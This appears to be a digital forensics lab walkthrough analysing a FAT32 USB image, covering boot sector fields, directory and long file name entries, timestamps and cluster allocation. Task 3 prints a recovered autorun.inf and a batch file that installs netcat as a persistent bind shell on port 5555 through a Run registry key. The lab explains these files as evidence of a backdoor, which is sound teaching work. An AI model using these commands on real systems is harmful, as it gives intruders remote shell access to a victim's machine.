Task 1: Analyzing FAT32 File System Volume Boot Record
Let us open our evidence file given named "[Lab10.dd]" [located at C:\DFP\Labs\Module05\Lab10\Lab10.dd] using Active@ Disk Editor, which would lead us to the following:

Content Image

In the template pane select the drop down arrow and change the selection from "No template" to "Master Boot Record". Reference the figure below.

Content Image

Content Image

After changing the template pane to Master Boot Record, click on the triangle next to each partition to collapse them. You are now looking at each partition as interpreted from the Master Boot Record. You should see that partition 1 is 350 MB and partition 2 is 69.7 GB, with the remaining 2 partition unsed.

Content Image

Expand the Partition 1 entry to begin our analysis. The result should look like the following:

Content Image

One observation to make is that the Partition identified by the software is an NTFS partition. This is incorrect. We are expecting a FAT32 file system If you review offset 450 you will see that the value is 0x0B. An NTFS volume is identified by the value of 0x07. In this case, 0x0B is the identified of a FAT32 partition, however it is an old and now rare version of FAT32 (circa Windows 95). So we will continue to investigate it as a FAT32 partition.

Click on the blue 2,048 hyperlink in the first sector row

Content Image

You should now be at the starting sector for the 1st partition identified by the MBR. Visually look for confirming clue in the ASCII section of hex editor. What you should see are is:

Text indicating the FAT32 file system signature is present "MSDOS5.0"
The name of the filesystem type "FAT32"
Content Image

While this is not neccesarily a forensic observation, it does help to ensure you are on the right track, and you will soon correlate and confirm.

In the template window, select FAT32 Boot Sector.

Using the boot sector menu that appeared to us to analyze the boot sector and answer the questions requested.

Number of sectors used for each cluster (sectors per cluster).

Click for Answer
Found at offset 13 and is 8 sectors. This means we have a USB using a 4096 bytes cluster.
The number of reserved sectors.

Click for Answer
Found at offset 14 and is 2,870 sectors. This means we can find the first FAT at sector number 2870.
Number of FATs and the size of each one.

Click for Answer
Found at offset 16 and is 2. This means we can have two FATs in this file system. Also, the size of each FAT is 14,949 sector which is found at offset 36.
Location of the backup for the boot sector (extra: find it, and copy it out)

Click for Answer
This is found at offset 50 and is 6. This means we can go to sector 6 and find a copy of the current boot sector. Since there are 512 bytes in each sector, to calculate the offset multiply sectors*512. Use the offset buttons to go to byte offset 3072 from curent position.
Go to Offset 3,072 bytes from current position.

Content Image

This should lead us exactly to offset 1051648, as seen below

Content Image

Now, highlight these 512 bytes and then right click on the desktop and select Paste Into File. Save the file (e.g., SuspectUSB-BKUP-VBR) and continue to the next question.

What is the cluster number of the root directory

Click for Answer
It is found at offset 44 and is 2. This means that the first cluster used by the root directory is at number 2, which is exactly how Microsoft defined it, as it always starts at 2, because cluster #0 and #1 are reserved.
What is the volume serial number

Click for Answer
It is found at offset 67 and is 58 2E DA D6.
What is th size of the whole file system in both sectors and bytes?

Click for Answer
Remember to multiply *number of sectors \* 512*. The value is found at offset 32 and is 15,339,520 sectors * 512 = 7853834240 bytes. Also, means 7490 MiB or ~7.8 GB.
Task 2: Basic File and Directory Analysis
Continue, using FTK Imager, to answer the requirements for this part of our investigation .

Number of files and directories found in the root directory

From the figure below, we can see that we have 2 directories and 8 files.

Content Image

To find a directory entry of a file or directory, first review the above figure. A visual inspection of the Tree, File List, and Hex Panes should reveal some visually recognizable strings. The hexadecimal code is the File Allocation Table (FAT).

Then, traverse the entries until you find the line that corresponds to the file name you are looking for, which is at the beginning of the entry. Click on a file in the File List. Look at the lower left hand corner, select the properties tab.

Content Image

If you look at the properties table, note the Name, Physical Size, Start Cluster, Start Sector.

Do a quick verification exercise to see if the starting sector contains the file information. You will need to calculate the offeset of the sector.

Because this image is using 512k sectors, the equation to calulate sectors to offset is offset = (Start Sector * 512) + 1. Try the math on your own. What is the starting offset for autorun.bat?

Click for Answer
The starting offset for autorun.bat is 354340865
In the Evidence Tree, click on Lab10.dd. Then right click in the white space and select Go To Offset. Enter the calculated offset, select decimal and beginning of file. Then OK.

Content Image

Now, locate the directory entry for the file slidenotes.pdf, by click on root in the Evidence Tree. Use the properties to determine the sectors and clusters.

Content Image

Note: actually, this file has more than one entry, but we will come back to this later.

The starting cluster number for each file and directory in the root. This task must be done first manually then verify your results using tool(s). Since this is a FAT32 file system, we have to identify the starting cluster number, which is four bytes, is split into two bytes each and found at offset 20-21 and 26-27 of the directory entry.

Be aware that even though we demonstrated using a tool to quickly locate the information, you always should do it manualy to verify the forensic tool is correctly interpreting the results.

Using the same example in the previous task, we have (all in hex):

Byte 20 = 01

Byte 21 = 00

Byte 26 = BC

Byte 27 = 40

Whih resultxs in: 0100BC40

And remember since it is written in little endian, then this means we have:

21 20 27 26 Which equals: 00 01 40 BC

Content Image

So, the first cluster for the slidenotes.pdf file is: 82108

Verify our results using the properties pane . As you can see below, the first cluster is indeed 82108.

Content Image

Always take the steps to manually verify this information. Computer forensics requires a methodology that does not depend BLINDLY on tools.

Did you observe any files with long file names? A long file name is a file that is longer than the standard eight dot three format, or eight characters for the file name and a three character extension seperated by a dot, for example "FILENAME.ZIP". Let's analyze at least two of them.

Files and directories that have upper case letters such as "Tools" also have a LFN directory entry. The files are:

Name Type System Volume Information Directory Tools Directory Anti-Forensics.txt File Glowing Element.jpg File knowledge_is_Wisdom.jpg File slidenotes.pdf File Text-on-the-board.jpg File

Let's analyze the first directory and the last file in the list above.

System Volume Information

Right click on the directory then go to Navigate Seek directory entry.

Now, since this is a LFN directory entry, then the first one that we landed on when using the menu above took us the short file name (SFN) directory entry, and the rest are the ones above it. Let's take a look at the following:

Content Image

As we know each entry is 32 bytes, so from the figure above we can see that this directory is using one SFN and two LFN entries. I will be analyzing them using two methods, manually and using tools.

The first example will be done based on the manual method, as follows:

I. Offset 0: is the file name using 8 bytes = 53 59 53 54 45 4D 7E 31 -> SYSTEM~1

II. Offset 8: is the file extension using 3 bytes = 20 20 20 -> no extension and it is padded because it is a directory

III. Offset 11: is the file attributes using one byte = 16 -> 00010110 (bits) -> It is a directory with the system and hidden attributes all set (directory, system, hidden)

IV. Offset 12: we find a single reserved byte

V. Offset 13: A single byte for the tenths of a second = 42 -> (hex) 66

VI. Offset 14: copying the next four bytes that represent the Creation Time and Creation Date = A5 0E 71 4B and using DCode [located at C:\DFP\Tools\Time] with MS-DOS 32-bit Hex Value we get the following: Fri, 17 November 2017 01:53:10 Local

This could be seen in the following:

Content Image

So, with the tenths of seconds, we get the following:

Fri, 17 November 2017 01:53:10.6 Local

VII. Offset 18: copying the next two bytes that represent the Last Accessed Date = 71 4B and using the same as before with DCode and MS-DOS 32-bit Hex we get the following: Fri, 17 November 2017 00:00:00 Local

We can see this in the following:

Content Image

[Note (1):] remember that FAT file systems have only Last Access Dates but no time, and that is why we see the time set to 00:00:00.

[Note (2):] I'm going to skip offset 20 and 21 for now, we'll get back to them shortly.

VIII. Offset 22: copying the next four bytes that represent the Last Modification Time and Last Modification Date = A6 0E 71 4B and using the same as before with DCode and MS-DOS 32-bit Hex we get the following: Fri, 17 November 2017 01:53:12 Local

We can see this in the following:

Content Image

IX. Offset 26: is the low two bytes of the first cluster number. We find here the value = 0300, and if we go back to offset 20 and 21, we find the high two bytes of the first cluster number. Using the same method, we did before, we get the following:

20 21 = 00 00

26 27 = 03 00

Then the first cluster would be at 00 00 00 03

X. Offset 28: is the file size in bytes. We find here the value 00 00 00 00, and that is because this is a directory, so its size will be zero.

Until now we have only analyzed the SFN part of this directory (same for files), so let us move on to the LFN part.

[LFN Part 1:]

I. Offset 0: is the sequence number using one byte. We find the value: 01

II. Offset 1: uses 10 bytes and holds the first five characters in Unicode of the long file name. We found the value: 53 00 79 00 73 00 74 00 65 00 -> S y s t e

III. Offset 11: is the file attribute using 1 byte. This entry holds the value 0F because it is a Long File Name

IV. Offset 12: we find one reserved byte, always holding 00

V. Offset 13: we find one byte holding a checksum value calculated based on the Short File Name. This value will be found in each LFN entry. The value here was: 72

VI. Offset 14: we find 12 bytes holding the next six characters in Unicode of the LFN. We found the value: 6D 00 20 00 56 00 6F 00 6C 00 75 00 -> m V o l u

[Note:] there is a SPACE character between the char "m" and "V" in the representation above.

VII. Offset 26: we find two bytes reserved and always will be zeros.

VIII. Offset 28: we find another 2 characters of the LFN. They will be using four bytes as it is in Unicode. So, the value we found here was: 6D006500 -> m e

[LFN Part 2:]

I. Offset 0: is the sequence number using one byte. We find the value: 42

Let me explain this a little. Since this sequence is 42, it means this is the last LFN entry which only has 2 entries. So, the number 4 is for the end of sequence, and the number 2 represents the number of entries we have here.

II. Offset 1: uses 10 bytes and holds the first five characters in Unicode of the long file name. We found the value: 20 00 49 00 6E 00 66 00 6F 00 -> I n f o

[Note:] there is a SPACE character at the beginning making them 5 Unicode chars.

III. Offset 11: is the file attribute using 1 byte. This entry holds the value 0F because it is a Long File Name

IV. Offset 12: we find one reserved byte, always holding 00

V. Offset 13: we find one byte holding a checksum value calculated based on the Short File Name. This value will be found in each LFN entry. The value here was: 72

Note: this was found in the first entry too. It helps to identify that all these entries belong to the same file name.

VI. Offset 14: we find 12 bytes holding the next six characters in Unicode of the LFN. We found the value: 72 00 6D 00 61 00 74 00 69 00 6F 00 -> r m a t i o

VII. Offset 26: we find two bytes reserved and always will be zeros.

VIII. Offset 28: we find another 2 characters of the LFN. They will be using four bytes as it is in Unicode. So, the value we found here was: 6E 00 00 00 -> n

The last byte is padded with zero since there is no characters left in the LFN.

In our next file, I will be using a much simpler method, and it is based on the features provided by WinHex. Let's get started.

Text-on-the-board.jpg

One of the advantages of using a forensic tool is it makes all the nightmare we saw before, extremely easy! You'll see soon!

Refer to the properties tab in FTK Imager to see the information parsed.

Content Image

As we can see, all the details are fully clear.

Now if you go backward 32 bytes, which should be the beginning of an entry (32 bytes each), you should be currently at the following:

As you can see, it was extremely easy to analyze LFN and SFNs using a basic forensic tool.

What are the creation dates of the files found, and what hypothesis do you have for their close creation date?

You should notice that all files have a very close creation time ranging from 11/17/2017 13:25:21.0 to 11/17/2017 13:26:06.0. I hypothesize that these files were either copied using a script or they were copy and pasted into this USB thumb drive and that is why they are very close to each other.

Which file was the first file copied to the USB, and how did you find that? (show two ways)

The second method would be to check the cluster numbers of the files/directories that are copied to the USB thumb drive. This could be done by exporting the list of files and directories into either XML or TSV file formats and then sorting the files based on their integer ID.

You will find, the file named nmap-5.51-setup.exe has the cluster number 7, which means it was the first among all these files copied to this USB thumb drive.

Task 3: Finding Suspicious Content and Analyzing Their File Directory Entries
We will continue our analysis to find any suspicious files and do some file checking by navigating through the content of the USB and the files found.

Which files are suspicious and why? What is us your hypo?
Click for Answer
the files that are suspicious are:
autorun.bat
autorun.inf
nc.exe
Form a Hypothesis: The reason is that autorun files are used to benefit from the autorun features found in systems. So the autorun.inf file is used to call and run the autorun.bat file.

The autorun.inf file contained the following:

[autorun]
open=autorun.bat
action="starting network service"
While the autorun.bat file contained the following:

copy nc.exe "%SYSTEMROOT%/System32"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "NETSRVICE" /t "REG_SZ" /d "%SYSTEMROOT%\System32\nc.exe -d -L -e cmd.exe -p 5555"
From the file above, we can see that the nc.exe file is being copied to the System32 directory under the system root directory (C:\Windows). After that, the REG ADD command is being used to add a registry entry to the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key so that each time the system reboots the nc.exe is executed and a cmd.exe is attached to it. This cmd.exe could be reached by connecting to port 5555 as seen above.

So we can clearly say that the USB thumb drive is being used to create some sort of BACKDOOR on the victim's system.

Analyze each of their directory entries checking most importantly their file attributes.

Click for Answer
You can apply the same process we did in the previous task (i.e., task #2) here.
Examine the autorun.inf file directory entry

Click for Answer
How many clusters did each file consume and what are they?
Number	File name	No. of Clusters Used	Cluster No.
1	autorun.bat	1	82159
2	autorun.inf	1	82158
3	nc.exe	15	82143 - 82157
